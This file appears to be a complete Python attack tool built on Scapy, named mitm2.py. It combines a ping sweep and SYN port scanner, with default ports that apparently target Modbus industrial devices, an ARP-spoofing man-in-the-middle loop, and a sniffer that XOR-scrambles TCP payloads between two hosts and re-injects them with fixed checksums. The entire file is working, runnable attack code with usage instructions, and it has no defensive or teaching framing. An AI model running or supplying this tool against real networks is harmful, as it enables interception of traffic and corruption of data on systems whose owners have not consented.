import ipaddress
import sys
import time
from scapy.all import (
    ARP,
    Ether,
    ICMP,
    IP,
    Raw,
    TCP,
    conf,
    get_if_hwaddr,
    send,
    sendp,
    sniff,
    sr1,
    srp,
)

conf.verb = 0


def icmp_ping_sweep(subnet, timeout=1):
    """
    Perform an ICMP ping sweep on the passed subnet to discover live hosts.
    """
    print(f"[*] Starting ICMP ping sweep on {subnet} (timeout={timeout}s)...")
    start_time = time.time()

    live_hosts = []
    net = ipaddress.ip_network(subnet, strict=False)

    for ip in net.hosts():
        ip_str = str(ip)
        packet = IP(dst=ip_str) / ICMP()
        response = sr1(packet, timeout=timeout, verbose=False)

        if response and response.haslayer(ICMP) and response.getlayer(ICMP).type == 0:
            print(f"[+] Host {ip_str} is alive ({response.summary()})")
            live_hosts.append(ip_str)

    elapsed_time = time.time() - start_time
    print(f"[*] ICMP ping sweep completed in {elapsed_time:.2f}s. Live hosts: {len(live_hosts)}\n")
    return live_hosts


def tcp_scan(target_ip, ports, timeout=1):
    """
    Perform a TCP SYN (half-open) scan on a single target IP across specified ports.
    """
    print(f"[*] Initiating TCP SYN Scan on target: {target_ip}")
    print(f"[*] Scanning {len(ports)} specified ports...")
    start_time = time.time()

    open_ports = []
    closed_ports = []
    filtered_ports = []

    for port in ports:
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=timeout, verbose=False)

        if response is None:
            filtered_ports.append(port)
        elif response.haslayer(TCP):
            tcp_flags = response.sprintf("%TCP.flags%")

            if "SA" in tcp_flags:
                print(f"[+] Port {port} is OPEN on {target_ip}.")
                open_ports.append(port)

                # Abort half-open connection cleanly without waiting for a response
                rst_packet = IP(dst=target_ip) / TCP(dport=port, flags="R")
                send(rst_packet, verbose=False)
            elif "R" in tcp_flags or "RA" in tcp_flags:
                closed_ports.append(port)
            else:
                filtered_ports.append(port)

    elapsed = time.time() - start_time
    print(f"[*] Scan completed in {elapsed:.2f}s for {target_ip}")
    print(f"    - Open Ports: {open_ports}")
    print(f"    - Closed Ports: {len(closed_ports)}")
    print(f"    - Filtered Ports: {len(filtered_ports)}\n")
    return open_ports


def resolve_mac(ip_addr, iface="eth0", retries=3, delay=0.2):
    for _ in range(retries):
        try:
            with open("/proc/net/arp", "r", encoding="utf-8") as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip_addr:
                        mac = parts[3].lower()
                        if mac != "00:00:00:00:00:00":
                            return mac
        except OSError:
            pass

        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr),
            iface=iface,
            timeout=1,
            verbose=False,
        )
        if ans:
            return ans[0][1].hwsrc.lower()

        time.sleep(delay)
    return None


def arp_spoof_loop(ip_a, ip_b, iface="eth0", interval=1.5):
    """
    Continuously poison ARP caches between ip_a and ip_b using Layer-2 sendp(),
    and restore legitimate MAC mappings on KeyboardInterrupt.
    """
    attacker_mac = get_if_hwaddr(iface)
    mac_a = resolve_mac(ip_a)
    mac_b = resolve_mac(ip_b)

    if not mac_a or not mac_b:
        print(f"[!] Could not resolve MAC addresses (A={ip_a} -> {mac_a}, B={ip_b} -> {mac_b}).")
        print("[!] Ensure both hosts are reachable on the L2 segment and try pinging them first.")
        return

    print(f"[*] Attacker MAC ({iface}): {attacker_mac}")
    print(f"[*] Target A: {ip_a} ({mac_a})")
    print(f"[*] Target B: {ip_b} ({mac_b})")
    print(f"[*] Spoofing {ip_a} <-> {ip_b} every {interval}s. Press Ctrl+C to stop and restore...\n")

    try:
        while True:
            # Tell A that B's IP is at ATTACKER_MAC
            pkt_to_a = Ether(dst=mac_a, src=attacker_mac) / ARP(
                op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b, hwsrc=attacker_mac
            )
            # Tell B that A's IP is at ATTACKER_MAC
            pkt_to_b = Ether(dst=mac_b, src=attacker_mac) / ARP(
                op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a, hwsrc=attacker_mac
            )
            sendp([pkt_to_a, pkt_to_b], iface=iface, verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP spoof and restoring ARP tables...")
        restore_a = Ether(dst=mac_a, src=mac_b) / ARP(
            op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b, hwsrc=mac_b
        )
        restore_b = Ether(dst=mac_b, src=mac_a) / ARP(
            op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a, hwsrc=mac_a
        )
        sendp([restore_a, restore_b], iface=iface, count=3, verbose=False)
        print("[*] ARP tables restored.")


def mutate_payload(payload: bytes) -> bytes:
    """
    Mutate/scramble payload bytes while preserving exact byte length so TCP
    sequence/acknowledgment offsets stay aligned.
    """
    if len(payload) <= 1:
        return payload
    buf = bytearray(payload)
    start = min(8, len(buf) - 1)
    for i in range(start, len(buf)):
        buf[i] ^= 0xFF
    return bytes(buf)


def mutate_and_inject_loop(ip_a, ip_b, iface="eth0"):
    """
    Sniff payload-bearing TCP packets between ip_a and ip_b, mutate payload bytes
    in-place, recalculate IPv4 and TCP checksums, and re-inject via sendp().
    """
    attacker_mac = get_if_hwaddr(iface)
    mac_a = resolve_mac(ip_a)
    mac_b = resolve_mac(ip_b)

    if not mac_a or not mac_b:
        print(f"[!] Could not resolve MAC addresses (A={ip_a} -> {mac_a}, B={ip_b} -> {mac_b}).")
        return

    print(f"[*] Attacker MAC ({iface}): {attacker_mac}")
    print(f"[*] Intercepting & mutating {ip_a} <-> {ip_b} (A={mac_a}, B={mac_b})")
    print("[*] Press Ctrl+C to stop...\n")

    def on_packet(pkt):
        if not pkt.haslayer(Ether) or pkt[Ether].src == attacker_mac:
            return
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        if {src_ip, dst_ip} != {ip_a, ip_b}:
            return

        orig_data = bytes(pkt[Raw].load)
        if len(orig_data) == 0:
            return

        new_data = mutate_payload(orig_data)
        next_hop_mac = mac_b if (src_ip == ip_a and dst_ip == ip_b) else mac_a

        rebuilt = (
            Ether(src=attacker_mac, dst=next_hop_mac)
            / IP(
                src=src_ip,
                dst=dst_ip,
                ttl=pkt[IP].ttl,
                id=pkt[IP].id,
                flags=pkt[IP].flags,
                frag=pkt[IP].frag,
                tos=pkt[IP].tos,
            )
            / TCP(
                sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                seq=pkt[TCP].seq,
                ack=pkt[TCP].ack,
                flags=pkt[TCP].flags,
                window=pkt[TCP].window,
                urgptr=pkt[TCP].urgptr,
                options=pkt[TCP].options,
            )
            / Raw(load=new_data)
        )

        # Clear checksums so Scapy recalculates IPv4 header checksum and TCP checksum
        del rebuilt[IP].chksum
        del rebuilt[TCP].chksum
        rebuilt = rebuilt.__class__(bytes(rebuilt))

        sendp(rebuilt, iface=iface, verbose=False)
        print(
            f"[MUTATED & INJECTED] {src_ip}:{pkt[TCP].sport} -> {dst_ip}:{pkt[TCP].dport} | "
            f"len={len(new_data)} | ip_csum=0x{rebuilt[IP].chksum:04x} | tcp_csum=0x{rebuilt[TCP].chksum:04x}"
        )

    bpf = f"tcp and host {ip_a} and host {ip_b}"
    try:
        sniff(iface=iface, filter=bpf, prn=on_packet, store=False)
    except KeyboardInterrupt:
        print("\n[*] Stopped packet mutation & re-injection.")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Recon + Port Scan: sudo python3 mitm2.py <Target IP or Subnet CIDR> [Comma-separated Ports]")
        print("  ARP Spoof MITM:    sudo python3 mitm2.py --spoof <IP_A> <IP_B> [iface] [interval]")
        print("  Mutate & Inject:   sudo python3 mitm2.py --mutate <IP_A> <IP_B> [iface]")
        sys.exit(1)

    if sys.argv[1] == "--spoof":
        if len(sys.argv) < 4:
            print("Usage: sudo python3 mitm2.py --spoof <IP_A> <IP_B> [iface] [interval]")
            sys.exit(1)
        target_a = sys.argv[2]
        target_b = sys.argv[3]
        net_iface = sys.argv[4] if len(sys.argv) > 4 else "eth0"
        spoof_interval = float(sys.argv[5]) if len(sys.argv) > 5 else 1.5
        arp_spoof_loop(target_a, target_b, iface=net_iface, interval=spoof_interval)
        sys.exit(0)

    if sys.argv[1] == "--mutate":
        if len(sys.argv) < 4:
            print("Usage: sudo python3 mitm2.py --mutate <IP_A> <IP_B> [iface]")
            sys.exit(1)
        target_a = sys.argv[2]
        target_b = sys.argv[3]
        net_iface = sys.argv[4] if len(sys.argv) > 4 else "eth0"
        mutate_and_inject_loop(target_a, target_b, iface=net_iface)
        sys.exit(0)

    target_input = sys.argv[1]
    default_ports = [80, 443, 502, 5020, 5021, 1881, 8080]

    if len(sys.argv) > 2:
        scan_ports = [int(p.strip()) for p in sys.argv[2].split(",")]
    else:
        scan_ports = default_ports

    try:
        net = ipaddress.ip_network(target_input, strict=False)
        if net.num_addresses > 1:
            targets = icmp_ping_sweep(target_input)
        else:
            targets = [str(net.network_address)]

        for host_ip in targets:
            tcp_scan(host_ip, scan_ports)
    except ValueError:
        tcp_scan(target_input, scan_ports)